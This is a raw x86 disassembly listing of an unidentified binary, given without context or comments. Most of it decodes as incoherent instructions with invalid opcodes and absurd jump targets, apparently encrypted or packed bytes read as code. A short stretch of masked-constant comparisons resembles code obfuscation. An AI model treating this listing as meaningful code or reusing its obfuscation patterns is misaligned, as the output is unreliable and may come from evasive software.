  41dd9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd9d:	test   al,0x2
  41dd9f:	mov    bh,0xeb
  41dda1:	inc    eax
  41dda2:	xchg   DWORD PTR [esp+0x69881aaf],edi
  41dda9:	and    al,0x11
  41ddab:	jbe    0x41ddb6
  41ddad:	adc    ch,dh
  41ddaf:	popa   
  41ddb0:	mov    bl,0x91
  41ddb2:	popa   
  41ddb3:	mov    ds:0x890a1a15,eax
  41ddb8:	xor    dh,0x1c
  41ddbb:	adc    BYTE PTR [ebx+0x5f60cc3e],bl
  41ddc1:	xchg   DWORD PTR [edi-0x3],edi
  41ddc4:	ror    BYTE PTR [eax-0x41b3b977],cl
  41ddca:	adc    DWORD PTR [edx-0x5d7976b8],ebp
  41ddd0:	add    eax,0xab4e8616
  41ddd5:	jp     0x41ddb2
  41ddd7:	in     al,0xa9
  41ddd9:	mov    edi,0x49ce3c1e
  41ddde:	mov    ch,BYTE PTR [ecx+0x4a]
  41dde1:	push   edx
  41dde2:	fwait
  41dde3:	sbb    DWORD PTR [ebp+0x39b94632],0x34
  41ddea:	icebp  
  41ddeb:	cmp    BYTE PTR [ebx],bl
  41dded:	mov    dh,0xd5
  41ddef:	inc    eax
  41ddf0:	cwde   
  41ddf1:	dec    edi
  41ddf2:	sub    esi,DWORD PTR [edx+0x7f]
  41ddf5:	shl    al,0x6
  41ddf8:	hlt    
  41ddf9:	fucomi st,st(6)
  41ddfb:	and    esp,edx
  41ddfd:	ret    0x23a3
  41de00:	sub    al,0xa6
  41de02:	daa    
  41de03:	outs   dx,DWORD PTR ds:[esi]
  41de04:	lahf   
  41de05:	ret    0x492e
  41de08:	adc    DWORD PTR [eax-0xb],ebx
  41de0b:	and    edx,edx
  41de0d:	cli    
  41de0e:	pushf  
  41de0f:	jo     0x41de78
  41de11:	pop    ebp
  41de13:	and    DWORD PTR [edi+0x57],ecx
  41de16:	leave  
  41de17:	push   ss
  41de18:	push   eax
  41de19:	or     eax,0xa8d10ddc
  41de1e:	xor    DWORD PTR [ebp+0x27],esi
  41de21:	fwait
  41de22:	clc    
  41de23:	push   es
  41de24:	dec    edx
  41de25:	pop    edi
  41de26:	xchg   esp,eax
  41de27:	enter  0x853d,0x4c
  41de2b:	(bad)  
  41de2c:	push   eax
  41de2d:	xor    ebx,DWORD PTR [ecx-0x1f]
  41de30:	bnd jle 0x41ddc9
  41de33:	add    eax,0x398df16b
  41de38:	xchg   edi,eax
  41de39:	mov    bh,0x99
  41de3b:	fisubr WORD PTR [esi+0x77]
  41de3e:	cmp    dh,BYTE PTR [eax+0x51dfe316]
  41de44:	xchg   DWORD PTR [ecx-0x9938023],edi
  41de4a:	in     al,dx
  41de4b:	mov    edi,0xea8911ac
  41de50:	shl    BYTE PTR [ebp-0x51],1
  41de53:	add    eax,0x292e18e5
  41de58:	sub    al,0x7c
  41de5a:	or     al,0xdd
  41de5c:	(bad)  
  41de5d:	shl    DWORD PTR [eax+0x2babe2f5],0x16
  41de64:	jl     0x41de35
  41de66:	jl     0x41de27
  41de68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41de69:	cmc    
  41de6a:	jp     0x41de7e
  41de6c:	cmp    BYTE PTR [ebp-0x1a],dl
  41de6f:	(bad)  [esi]
  41de71:	jmp    0x41deea
  41de73:	xchg   ebp,eax
  41de74:	inc    ecx
  41de75:	stos   DWORD PTR es:[edi],eax
  41de76:	xor    eax,DWORD PTR [esp+ecx*4-0xf30cae2]
  41de7d:	xor    esi,ecx
  41de7f:	push   esp
  41de80:	push   ss
  41de81:	sub    edi,DWORD PTR [eax]
  41de83:	arpl   di,ax
  41de85:	mov    ah,0xf4
  41de87:	inc    ebx
  41de88:	push   edx
  41de89:	jb     0x41de96
  41de8b:	and    eax,0x524d59a0
  41de90:	or     al,0x80
  41de92:	cs shr bl,0xaf
  41de96:	mov    esp,0xa8243d0e
  41de9b:	push   edi
  41de9c:	inc    esp
  41de9d:	mov    esi,0xd51833da
  41dea2:	loopne 0x41de6b
  41dea4:	mov    dl,bh
  41dea6:	imul   esp,DWORD PTR [ebx],0x59d313c8
  41deac:	test   BYTE PTR [ebp+0x6c],ch
  41deaf:	and    al,0xa9
  41deb1:	enter  0x349a,0xa0
  41deb5:	pop    ds
  41deb6:	clc    
  41deb7:	ret    0xb07
  41deba:	xor    al,0xd6
  41debc:	fldenv ss:[eax]
  41debf:	adc    edx,DWORD PTR [eax]
  41dec1:	and    BYTE PTR [ebx-0x68541450],cl
  41dec7:	call   0x549e234
  41decc:	call   0x70a039a5
  41ded1:	sub    eax,0x78410ab5
  41ded6:	or     eax,0x3ed62e3d
  41dedb:	or     ebx,0x77
  41dede:	sbb    BYTE PTR [esi],dh
  41dee0:	stc    
  41dee1:	push   edi
  41dee2:	push   esi
  41dee3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dee4:	(bad)  
  41dee5:	cmp    eax,0x20ef1d1f
  41deea:	lods   eax,DWORD PTR ds:[esi]
  41deeb:	xchg   edx,eax
  41deec:	mov    ah,0x46
  41deee:	inc    ecx
  41deef:	dec    esp
  41def0:	push   ecx
  41def1:	xchg   ecx,eax
  41def2:	arpl   WORD PTR [ebp-0x3aff661c],di
  41def8:	jb     0x41de95
  41defa:	xchg   esp,eax
  41defb:	out    dx,eax
  41defc:	xor    ah,BYTE PTR [eax+0x12]
  41deff:	xchg   esi,eax
  41df00:	pop    ebp
  41df01:	jp     0x41def5
  41df03:	mov    al,0xbd
  41df05:	push   ecx
  41df06:	mov    DWORD PTR [edx+0x2b],eax
  41df09:	clc    
  41df0a:	pop    edx
  41df0b:	mov    ds:0x39acb53b,eax
  41df10:	pusha  
  41df11:	test   ebp,esi
  41df13:	dec    edi
  41df14:	jecxz  0x41df07
  41df16:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  41df18:	add    al,0xc8
  41df1a:	xchg   esp,eax
  41df1b:	dec    esp
  41df1c:	cdq    
  41df1d:	sub    DWORD PTR [edx],esi
  41df1f:	div    DWORD PTR [esi-0x7d]
  41df22:	cwde   
  41df23:	xchg   DWORD PTR [eax],esp
  41df25:	repnz adc al,0x84
  41df28:	out    0x97,al
  41df2a:	shr    DWORD PTR [edi-0x36220948],cl
  41df30:	jl     0x41df82
  41df32:	ins    BYTE PTR es:[edi],dx
  41df33:	addr16 loopne 0x41df22
  41df36:	out    dx,al
  41df37:	or     al,0x52
  41df39:	cwde   
  41df3a:	pop    eax
  41df3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41df3c:	into   
  41df3d:	jl     0x41dee6
  41df3f:	sahf   
  41df40:	mov    esp,0x7e19911b
  41df45:	fs inc edi
  41df47:	mov    bl,0x8f
  41df49:	sub    eax,0xe957e481
  41df4e:	mov    ebp,0x400a1aaa
  41df53:	lods   eax,DWORD PTR ds:[esi]
  41df54:	pop    edx
  41df55:	or     DWORD PTR [edx+edi*1],0xa813b73f
  41df5c:	shr    bl,cl
  41df5e:	cli    
  41df5f:	pop    esi
  41df60:	ins    BYTE PTR es:[edi],dx
  41df61:	out    0x6b,eax
  41df63:	enter  0x12ab,0xc3
  41df67:	rcl    BYTE PTR [ecx],cl
  41df69:	sbb    ah,BYTE PTR [edi]
  41df6b:	pushf  
  41df6c:	ja     0x41dfe7
  41df6e:	sbb    ecx,edx
  41df70:	rol    bh,0xe9
  41df73:	sbb    BYTE PTR [esi],bh
  41df75:	mov    al,0x90
  41df77:	lock into 
  41df79:	jne    0x41df86
  41df7b:	lea    edi,[eax+0x5c64fb46]
  41df81:	push   ecx
  41df82:	xlat   BYTE PTR ds:[ebx]
  41df83:	outs   dx,BYTE PTR ds:[esi]
  41df84:	mov    eax,0x7fa1b8db
  41df89:	xor    DWORD PTR [eax],ebx
  41df8b:	or     BYTE PTR [eax+ebx*1-0x1a9a31c9],cl
  41df92:	cmp    eax,0x6139f195
  41df97:	jg     0x41df8b
  41df99:	in     al,dx
  41df9a:	aaa    
  41df9b:	pop    edi
  41df9c:	add    ah,ch
  41df9e:	push   esi
  41df9f:	mov    ebp,0xb4b5bc6f
  41dfa4:	enter  0x27e0,0x24
  41dfa8:	cmp    dh,BYTE PTR [ecx]
  41dfaa:	out    0xa6,al
  41dfac:	das    
  41dfad:	xor    DWORD PTR [edx+ebp*1-0x50],0x15
  41dfb2:	add    al,0x94
  41dfb4:	fild   DWORD PTR [ebp+0x50e8f31e]
  41dfba:	adc    ah,BYTE PTR [edi]
  41dfbc:	jne    0x41df9b
  41dfbe:	jmp    0xf572cb13
  41dfc3:	mov    ch,0x80
  41dfc5:	sbb    esp,ebx
  41dfc7:	das    
  41dfc8:	aas    
  41dfc9:	stc    
  41dfca:	aas    
  41dfcb:	jns    0x41df68
  41dfcd:	jno    0x41dfd3
  41dfcf:	jns    0x41dfb0
  41dfd1:	int3   
  41dfd2:	cmp    eax,0x2cbc3abe
  41dfd7:	lahf   
  41dfd8:	push   edx
  41dfd9:	add    ebx,DWORD PTR [ebx+0x26]
  41dfdc:	rol    DWORD PTR [ecx+edi*4],cl
  41dfdf:	fldenv [eax+0x36]
  41dfe2:	xor    bl,al
  41dfe4:	mov    eax,ds:0x949d77df
  41dfe9:	(bad)  
  41dfea:	xor    al,0x23
  41dfec:	xor    eax,0xad128acd
  41dff1:	add    al,0x20
  41dff3:	and    al,0xd3
  41dff5:	fwait
  41dff6:	das    
  41dff7:	jae    0x41e058
  41dff9:	sbb    eax,0x24d46a5e
  41dffe:	popa   
  41dfff:	cmp    eax,0x6455fdd5
  41e004:	xchg   ebx,eax
  41e005:	xchg   ebx,eax
  41e006:	aas    
  41e007:	sub    DWORD PTR [ebx],0xffffff9f
  41e00a:	mov    ah,0xf7
  41e00c:	loopne 0x41dfb1
  41e00e:	stc    
  41e00f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e010:	retf   0x4440
  41e013:	out    dx,al
  41e014:	das    
  41e015:	fwait
  41e016:	adc    eax,0x5b056797
  41e01b:	mov    bh,0x48
  41e01d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e01e:	pusha  
  41e01f:	push   0xc1af77fb
  41e024:	dec    eax
  41e025:	pop    esp
  41e026:	addr16 mov eax,cr1
  41e02a:	(bad)  
  41e02b:	xchg   edi,eax
  41e02c:	cli    
  41e02d:	mov    dh,0x21
  41e02f:	sbb    ah,ch
  41e031:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e032:	and    BYTE PTR [edx-0x4be56a88],al
  41e038:	in     al,dx
  41e039:	lahf   
  41e03a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e03b:	mov    ds:0xf65e1cb8,al
  41e040:	neg    bh
  41e042:	cmp    bh,BYTE PTR [esi+0x64b50332]
  41e048:	jmp    0x1659fcf5
  41e04d:	sub    ebp,DWORD PTR [eax-0x63036c8a]
  41e053:	(bad)  
  41e054:	clc    
  41e055:	add    BYTE PTR [ebp-0x4f5d3ca6],cl
  41e05b:	sti    
  41e05c:	sbb    eax,0x21d40614
  41e061:	dec    esp
  41e062:	call   FWORD PTR [edi-0x12]
  41e065:	(bad)  
  41e066:	fild   QWORD PTR [edi+ebx*4]
  41e069:	mov    ds:0x57dec5b0,eax
  41e06e:	sub    eax,0xa10c4d6d
  41e073:	jnp    0x41e095
  41e075:	fidivr WORD PTR [ecx]
  41e077:	push   eax
  41e078:	fisttp QWORD PTR [edi+eiz*4+0x37d9eb27]
  41e07f:	enter  0x52b3,0x17
  41e083:	add    al,0xaa
  41e085:	adc    cl,dh
  41e087:	inc    edx
  41e088:	iret   
  41e089:	sbb    BYTE PTR [edi+0x3ab8e82b],ah
  41e08f:	mov    DWORD PTR [ebp-0x1e9f797e],ebx
  41e095:	inc    ebp
  41e096:	push   eax
  41e097:	popf   
  41e098:	stc    
  41e099:	mov    edx,0x9d8b6f1a
  41e09e:	mov    ebp,0x285165b8
  41e0a3:	rcl    BYTE PTR [edi],0x73
  41e0a6:	jbe    0x41e0de
  41e0a8:	repz push cs
  41e0aa:	cwde   
  41e0ab:	je     0x41e081
  41e0ad:	pop    edi
  41e0ae:	mov    cl,0x2f
  41e0b0:	pop    ecx
  41e0b1:	xchg   edx,eax
  41e0b2:	popa   
  41e0b3:	aad    0xb7
  41e0b5:	push   edi
  41e0b6:	ret    
  41e0b7:	enter  0x63ee,0x94
  41e0bb:	iret   
  41e0bc:	dec    edx
  41e0bd:	dec    ebp
  41e0be:	(bad)  
  41e0bf:	pop    ebp
  41e0c0:	dec    esi
  41e0c1:	(bad)  
  41e0c2:	imul   edx,edi,0x7b
  41e0c5:	popf   
  41e0c6:	xor    cl,dl
  41e0c8:	add    BYTE PTR [ebx+edi*1],bl
  41e0cb:	mov    ds:0x293f5dba,eax
  41e0d0:	cdq    
  41e0d1:	inc    edx
  41e0d2:	xchg   BYTE PTR ds:0x1063d666,dl
  41e0d8:	sub    bl,bl
  41e0da:	xor    DWORD PTR [esi-0x7d360f08],ecx
  41e0e0:	aas    
  41e0e1:	jb     0x41e155
  41e0e3:	xor    DWORD PTR [edx-0x21],edx
  41e0e6:	xchg   esp,eax
  41e0e7:	test   eax,0x94d79b45
  41e0ec:	lods   eax,DWORD PTR ds:[esi]
  41e0ed:	jne    0x41e155
  41e0ef:	hlt    
  41e0f0:	inc    eax
  41e0f1:	add    eax,0xe34f5de8
  41e0f6:	cmp    ebx,DWORD PTR [ebx-0x70cc129]
  41e0fc:	dec    ebp
  41e0fd:	call   0xbc65:0xb231cebd
  41e104:	iret   
  41e105:	mov    edx,ecx
  41e107:	jl     0x41e0f5
  41e109:	aas    
  41e10a:	push   0xe78265a5
  41e10f:	and    edx,DWORD PTR [edi]
  41e111:	bound  ebp,QWORD PTR [edi-0x4fe0b646]
  41e117:	(bad)  
  41e118:	mov    DWORD PTR [esp+0x10],0x421a
  41e120:	mov    eax,DWORD PTR [esp+0x10]
  41e124:	and    eax,0xffffc244
  41e129:	add    eax,DWORD PTR [esp+0x30]
  41e12d:	and    eax,0xfffffe5a
  41e132:	sub    eax,0x2ae1
  41e137:	and    eax,0x6f90
  41e13c:	mov    DWORD PTR [esp+0x30],eax
  41e140:	mov    DWORD PTR [esp+0x10],0x1515
  41e148:	mov    eax,DWORD PTR [esp+0x10]
  41e14c:	mov    ecx,DWORD PTR [esp+0x30]
  41e150:	or     eax,0x7113
  41e155:	add    eax,0x3d6a
  41e15a:	cmp    ecx,eax
  41e15c:	je     0x41e9ea
  41e162:	mov    eax,DWORD PTR [esp+0x40]
  41e166:	mov    edx,DWORD PTR [esp+0x18]
  41e16a:	mov    edi,DWORD PTR [esp+0x1c]
  41e16e:	xor    ecx,ecx
  41e170:	shld   ecx,eax,0x2
  41e174:	shl    eax,0x2
  41e177:	xor    eax,ebx
  41e179:	xor    ecx,esi
  41e17b:	cmp    eax,edx
  41e17d:	jne    0x41e18b
  41e183:	cmp    ecx,edi
  41e185:	je     0x41e9a3
  41e18b:	mov    eax,DWORD PTR [esp+0x44]
  41e18f:	mov    eax,DWORD PTR [esp+0x44]
  41e193:	mov    eax,DWORD PTR [esp+0x44]
  41e197:	mov    ecx,DWORD PTR [esp+0x44]
  41e19b:	xor    eax,0xa4069aaf
  41e1a0:	xor    ecx,0xfffffffe
  41e1a3:	shr    eax,0x2
  41e1a6:	shl    ecx,0x1e
  41e1a9:	or     eax,ecx
  41e1ab:	xor    ecx,ecx
  41e1ad:	shld   ecx,eax,0x2
  41e1b1:	shl    eax,0x2
  41e1b4:	xor    eax,ebx
  41e1b6:	xor    ecx,esi
  41e1b8:	cmp    eax,0xca79a571
  41e1bd:	jne    0x41e1cb
  41e1c3:	cmp    ecx,esi
  41e1c5:	je     0x41e9ea
  41e1cb:	mov    eax,DWORD PTR [esp+0x60]
  41e1cf:	cdq    
  41e1d0:	mov    eax,DWORD PTR [esp+0x60]
  41e1d4:	mov    ecx,edx
  41e1d6:	cdq    
  41e1d7:	shld   edx,eax,0x2
  41e1db:	shr    ecx,0x1e
  41e1de:	xor    edi,edi
  41e1e0:	jmp    0x41e5af
  41e1e5:	inc    esp
  41e1e6:	mov    eax,ds:0x1a1c22c9
  41e1eb:	and    bl,BYTE PTR [edi+0x7e4d5dcf]
  41e1f1:	arpl   WORD PTR [ebp+0x3b],bp
  41e1f4:	mov    esi,0x18163fc6
  41e1f9:	mov    esp,0x98181812
  41e1fe:	mov    ah,BYTE PTR [edx+0x4ed25af6]
  41e204:	mov    dl,0xa0
  41e206:	mov    edi,ss
  41e208:	jb     0x41e24e
  41e20a:	pop    edi
  41e20b:	sub    ch,al
  41e20d:	les    esp,FWORD PTR [edi]
  41e20f:	test   DWORD PTR [esi],ebp
  41e211:	frstor [esi+0x1f59ced1]
  41e217:	push   ecx
  41e218:	out    dx,al
  41e219:	sub    ebp,edx
  41e21b:	sub    BYTE PTR [eax+0x76b32f60],cl
  41e221:	jmp    FWORD PTR [ebx]
  41e223:	scas   eax,DWORD PTR es:[edi]
  41e224:	dec    ecx
  41e225:	xor    al,0xae
  41e227:	or     al,0x25
  41e229:	shl    esp,1
  41e22b:	mov    eax,0x15aafee7
  41e230:	push   cs
  41e231:	lds    esi,FWORD PTR [ebx]
  41e233:	dec    esp
  41e234:	mov    WORD PTR [edi+eax*8],?
  41e237:	inc    edx
  41e238:	xlat   BYTE PTR ss:[ebx]
  41e23a:	xor    al,0x57
  41e23c:	jo     0x41e286
  41e23e:	repz dec edi
  41e240:	retf   
  41e241:	mov    ds:0x4f453a7,eax
  41e246:	mov    ebp,0x7653132
  41e24b:	add    BYTE PTR [eax+esi*2-0x2c],bh
  41e24f:	mov    ebx,0xedc3c29f
  41e254:	push   edx
  41e255:	or     bh,BYTE PTR [ebx]
  41e257:	js     0x41e28b
  41e259:	push   ds
  41e25a:	xor    eax,0xddfd3b12
  41e25f:	mov    WORD PTR [ebp+0x25108166],ds
  41e265:	jne    0x41e239
  41e267:	rcr    BYTE PTR [ecx+0x5d],cl
  41e26a:	pop    edx
  41e26b:	out    dx,al
  41e26c:	enter  0x5632,0x32
  41e270:	push   ebx
  41e271:	fdivr  DWORD PTR [esi+eax*8]
  41e274:	outs   dx,DWORD PTR ds:[esi]
  41e275:	retf   0xb93b
  41e278:	stc    
  41e279:	js     0x41e2a1
  41e27b:	add    eax,0xf3a9138b
  41e280:	cmp    BYTE PTR [edx-0x28],ch
  41e283:	add    BYTE PTR [ebx+0xc],ch
  41e286:	cmp    eax,0xbd3854f3
  41e28b:	sbb    bh,BYTE PTR [edx-0x1a2835c3]
  41e291:	xchg   esi,eax
  41e292:	jae    0x41e293
  41e294:	inc    ebp
  41e295:	repz cmp ebx,DWORD PTR [edx-0x13]
  41e299:	cmp    bl,ch
  41e29b:	lock mov WORD PTR es:[ebx-0x6e8959bd],ss
  41e2a3:	lds    ecx,FWORD PTR [esp+eax*2]
  41e2a6:	in     al,dx
  41e2a7:	shl    ah,cl
  41e2a9:	in     al,dx
  41e2aa:	sub    ch,dh
  41e2ac:	ins    DWORD PTR es:[edi],dx
  41e2ad:	fiadd  DWORD PTR [ebx]
  41e2af:	inc    ebx
  41e2b0:	sub    ebp,DWORD PTR [edx-0x215162dc]
  41e2b6:	xchg   esi,eax
  41e2b7:	mov    esp,0x313f10ae
  41e2bc:	jnp    0x41e312
  41e2be:	call   0xa13a:0x61e47412
  41e2c5:	push   edi
  41e2c6:	pop    edx
  41e2c7:	jmp    0xd5e7:0xfc4e39a1
  41e2ce:	(bad)  
  41e2cf:	jae    0x41e25c
  41e2d1:	cdq    
  41e2d2:	sbb    eax,0x92053aa3
  41e2d7:	mov    esi,0xbc1fe97d
  41e2dc:	test   BYTE PTR ds:0x4c81b7ed,dh
  41e2e2:	add    cl,al
  41e2e4:	push   cs
  41e2e5:	add    al,BYTE PTR [esi+0x19]
  41e2e8:	add    bh,BYTE PTR [ebx-0x7e7c84e0]
  41e2ee:	xor    al,0x25
  41e2f0:	add    DWORD PTR [edi],ebp
  41e2f2:	push   0xffffff91
  41e2f4:	into   
  41e2f5:	out    dx,eax
  41e2f6:	ss mov ah,0xb
  41e2f9:	fidiv  DWORD PTR [ecx-0x62c2b611]
  41e2ff:	mov    ds:0x2ab3e4ec,al
  41e304:	test   eax,0xf4fc33b4
  41e309:	sub    eax,0x83f219f2
  41e30e:	add    al,0xe
  41e310:	mov    edx,0x531c932c
  41e315:	adc    BYTE PTR [ebx],bl
  41e317:	mov    esp,0x67973238
  41e31c:	rcr    DWORD PTR [edi-0x16],1
  41e31f:	test   BYTE PTR [eax+0x4debaf6a],bl
  41e325:	mov    bl,0x1
  41e327:	(bad)  
  41e328:	jo     0x41e3a5
  41e32a:	test   al,0xdd
  41e32c:	aad    0x60
  41e32e:	out    0x1c,eax
  41e330:	ins    BYTE PTR es:[edi],dx
  41e331:	mov    dl,0x86
  41e333:	sti    
  41e334:	shr    DWORD PTR [edx-0x22a6167a],cl
  41e33a:	and    BYTE PTR [ebp+0x1c],bl
  41e33d:	popa   
  41e33e:	dec    ebp
  41e33f:	pop    ecx
  41e340:	mov    eax,DWORD PTR [ecx+edi*4]
  41e343:	lock mov eax,0x8ff6143
  41e349:	cmp    ebx,DWORD PTR [eax]
  41e34b:	inc    esi
  41e34c:	sbb    eax,0xe79ecea3
  41e351:	mov    eax,0x11d4227e
  41e356:	addr16 mov eax,ds:0xc71a
  41e35a:	adc    DWORD PTR [eax+edx*8-0x3],ebx
  41e35e:	jg     0x41e33a
  41e360:	fisttp WORD PTR [ebx]
  41e362:	mov    edi,0x771947a3
  41e367:	sub    ah,BYTE PTR [ebx]
  41e369:	push   cs
  41e36a:	(bad)  
  41e36b:	nop
  41e36c:	jle    0x41e33e
  41e36e:	icebp  
  41e36f:	sub    dl,cl
  41e371:	(bad)  
  41e373:	inc    BYTE PTR [edi]
  41e375:	sbb    BYTE PTR [ebp-0x50e19394],ah
  41e37b:	xchg   ecx,eax
  41e37c:	(bad)  
  41e37d:	xor    ebx,DWORD PTR [ecx-0x560e4310]
  41e383:	jmp    0x41e38e
  41e385:	xchg   edi,eax
  41e386:	jne    0x41e3f3
  41e388:	jmp    0x19e2:0xb1e0593b
  41e38f:	sub    al,0xdb
  41e391:	std    
  41e392:	inc    ebp
  41e393:	inc    ecx
  41e394:	cmp    DWORD PTR [edi+0x7d19a44b],ecx
  41e39a:	add    esi,DWORD PTR [eax+0x3a51fb55]
  41e3a0:	dec    edx
  41e3a1:	imul   esp,DWORD PTR [ecx],0x27000cf9
  41e3a7:	cmp    dh,bl
  41e3a9:	xchg   esi,eax
  41e3aa:	mov    al,ds:0xca07a12f
  41e3af:	sbb    al,0x46
  41e3b1:	jl     0x41e34b
  41e3b3:	test   BYTE PTR [edi+0x39c80f02],ch
  41e3b9:	pop    ds
  41e3ba:	vaddss xmm4,xmm6,DWORD PTR [eax-0x322536fd]
  41e3c2:	das    
  41e3c3:	or     BYTE PTR [edi+0x5d],0xb1
  41e3c7:	pop    eax
  41e3c8:	scas   eax,DWORD PTR es:[edi]
  41e3c9:	jp     0x41e3c4
  41e3cb:	dec    esp
  41e3cc:	ret    0x71e7
  41e3cf:	repnz fnstsw WORD PTR [eax]
  41e3d2:	(bad)  
  41e3d3:	jmp    0x6e33:0x6aaf7d02
  41e3da:	add    DWORD PTR [eax-0x20],edx
  41e3dd:	data16 mov al,0x33
  41e3e0:	dec    esp
  41e3e1:	cmc    
  41e3e2:	mov    bh,0xd5
  41e3e4:	cmp    al,0xcf
  41e3e6:	retf   0xa9af
  41e3e9:	in     al,0x95
  41e3eb:	adc    eax,esi
  41e3ed:	in     al,dx
  41e3ee:	cmc    
  41e3ef:	cmp    al,dh
  41e3f1:	mov    esi,0xaee4ab1e
  41e3f6:	dec    eax
  41e3f7:	add    dh,BYTE PTR [esp+edi*4]
  41e3fa:	outs   dx,DWORD PTR ds:[esi]
  41e3fb:	(bad)  
  41e3fc:	sti    
  41e3fd:	(bad)  
  41e3fe:	fs jmp 0x51bd:0xc27e6188
  41e406:	enter  0x989b,0x5a
  41e40a:	sbb    bh,BYTE PTR [esi]
  41e40c:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e40e:	mov    ch,0xc6
  41e410:	ds pop eax
  41e412:	sub    DWORD PTR [edi],edx
  41e414:	jb     0x41e421
  41e416:	pop    ds
  41e417:	enter  0x25d5,0xc1
  41e41b:	pushf  
  41e41c:	xchg   ecx,eax
  41e41d:	nop
  41e41e:	mov    esp,0xe852f447
  41e423:	push   ss
  41e424:	inc    esp
  41e425:	loopne 0x41e49f
  41e427:	xlat   BYTE PTR ds:[ebx]
  41e428:	daa    
  41e429:	pop    ecx
  41e42a:	and    al,bl
  41e42c:	loope  0x41e3d9
  41e42e:	aam    0x99
  41e430:	pop    ebx
  41e431:	stos   BYTE PTR es:[edi],al
  41e432:	fnstcw WORD PTR [ecx+0x27]
  41e435:	or     bh,bl
  41e437:	sub    DWORD PTR [edi],edi
  41e439:	ins    DWORD PTR es:[edi],dx
  41e43a:	dec    BYTE PTR [ecx]
  41e43c:	xor    BYTE PTR [edi],cl
  41e43e:	popa   
  41e43f:	mov    dh,0x9a
  41e441:	js     0x41e41d
  41e443:	fdivr  DWORD PTR [ecx]
  41e445:	loope  0x41e425
  41e447:	cmp    ah,BYTE PTR [eax-0x55]
  41e44a:	div    DWORD PTR [edx-0x37]
  41e44d:	stc    
  41e44e:	push   esp
  41e44f:	repnz scas eax,DWORD PTR es:[edi]
  41e451:	loop   0x41e412
  41e453:	xchg   esi,eax
  41e454:	push   es
  41e455:	out    dx,eax
  41e456:	inc    esp
  41e457:	xor    al,0xb5
  41e459:	pop    esi
  41e45a:	push   edi
  41e45b:	add    eax,0xcad251b2
  41e460:	or     eax,0xaa6b44f1
  41e465:	and    eax,0x7f448874
  41e46a:	pop    esi
  41e46b:	dec    eax
  41e46c:	jb     0x41e464
  41e46e:	loope  0x41e4a6
  41e470:	ja     0x41e40e
  41e472:	fstp   st(7)
  41e474:	test   al,0xe8
  41e476:	or     al,0x7b
  41e478:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e479:	inc    esi
  41e47a:	lahf   
  41e47b:	pop    ebx
  41e47c:	lods   eax,DWORD PTR ds:[esi]
  41e47d:	fs cmp eax,ebp
  41e480:	scas   al,BYTE PTR es:[edi]
  41e481:	dec    ebp
  41e482:	mov    ch,0xf
  41e484:	mov    ss,esi
  41e486:	iret   
  41e487:	fsubrp st(2),st
  41e489:	loopne 0x41e44e
  41e48b:	ret    0xf9d2
  41e48e:	pop    edx
  41e48f:	dec    ebp
  41e490:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e491:	retf   
  41e492:	mov    ebx,0x4f8b0861
  41e497:	add    bl,BYTE PTR [ecx-0x5858d30e]
  41e49d:	inc    eax
  41e49e:	enter  0xa909,0x2c
  41e4a2:	sub    eax,0x2029936a
  41e4a7:	cmc    
  41e4a8:	lock jmp 0x7aa0:0x6cda3193
  41e4b0:	add    BYTE PTR [eax-0x53],ah
  41e4b3:	cmp    al,0x4b
  41e4b5:	out    0xb1,al
  41e4b7:	test   eax,0x54f524ba
  41e4bc:	xchg   esp,eax
  41e4bd:	mov    DWORD PTR [ecx-0x71d2761],ebp
  41e4c3:	in     eax,dx
  41e4c4:	mov    ds:0x5b1eddad,eax
  41e4c9:	push   ss
  41e4ca:	mov    ds:0xfbaa40b7,eax
  41e4cf:	in     eax,0x18
  41e4d1:	shl    esp,0x36
  41e4d4:	out    dx,al
  41e4d5:	pop    ecx
  41e4d6:	cwde   
  41e4d7:	ins    DWORD PTR es:[di],dx
  41e4d9:	push   0xffffffb1
  41e4db:	jno    0x41e48b
  41e4dd:	std    
  41e4de:	push   ebp
  41e4df:	out    0xb5,eax
  41e4e1:	(bad)  
  41e4e2:	sar    eax,cl
  41e4e4:	jns    0x41e54c
  41e4e6:	xchg   ecx,ebp
  41e4e8:	mov    ecx,0xc1900ad8
  41e4ed:	jbe    0x41e4dc
  41e4ef:	out    0xec,eax
  41e4f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e4f2:	xchg   ebx,eax
  41e4f3:	(bad)  
  41e4f4:	ja     0x41e4e5
  41e4f6:	mov    ah,0x9b
  41e4f8:	pushf  
  41e4f9:	xor    ch,dl
  41e4fb:	test   eax,0x3999909f
  41e500:	cmp    BYTE PTR [esi+eiz*4],dh
  41e503:	rcl    DWORD PTR [esi+0x67],1
  41e506:	sti    
  41e507:	pushf  
  41e508:	add    al,0x6
  41e50a:	aas    
  41e50b:	std    
  41e50c:	lea    edx,[esi-0x6b199d35]
  41e512:	push   es
  41e513:	imul   ebp,DWORD PTR [eax-0x27],0x29
  41e517:	mov    al,0x2d
  41e519:	rcr    dh,1
  41e51b:	mov    dh,0xb3
  41e51d:	fs inc esp
  41e51f:	or     DWORD PTR [ebp+0x4d],esp
  41e522:	outs   dx,DWORD PTR ds:[esi]
  41e523:	mov    bh,0x6b
  41e525:	xor    eax,0x1fc6192e
  41e52a:	mov    bh,0xfb
  41e52c:	mov    bh,0xfe
  41e52e:	inc    ebp
  41e52f:	push   es
  41e530:	sahf   
  41e531:	push   cs
  41e532:	mov    edx,0x426f0edd
  41e537:	adc    esp,DWORD PTR [ebx+0x1a910d35]
  41e53d:	inc    eax
  41e53e:	popa   
  41e53f:	fisub  DWORD PTR [edx]
  41e541:	inc    eax
  41e542:	out    dx,eax
  41e543:	mov    bl,0xa7
  41e545:	test   al,0xa5
  41e547:	pop    edi
  41e548:	cld    
  41e549:	inc    ebp
  41e54a:	inc    ebp
  41e54b:	hlt    
  41e54c:	imul   esi,DWORD PTR [ebx-0x48],0xe507b8a0
